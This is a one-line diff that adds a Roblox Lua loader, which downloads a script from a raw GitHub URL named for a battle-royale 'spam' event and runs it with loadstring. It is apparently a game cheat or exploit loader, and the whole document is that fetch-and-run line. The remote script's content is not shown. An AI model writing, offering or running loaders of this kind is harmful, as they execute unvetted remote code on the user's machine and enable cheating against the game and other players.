@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/event-r1-battle-royale-spam7-wqjj5iwrmbney6.lua"))()
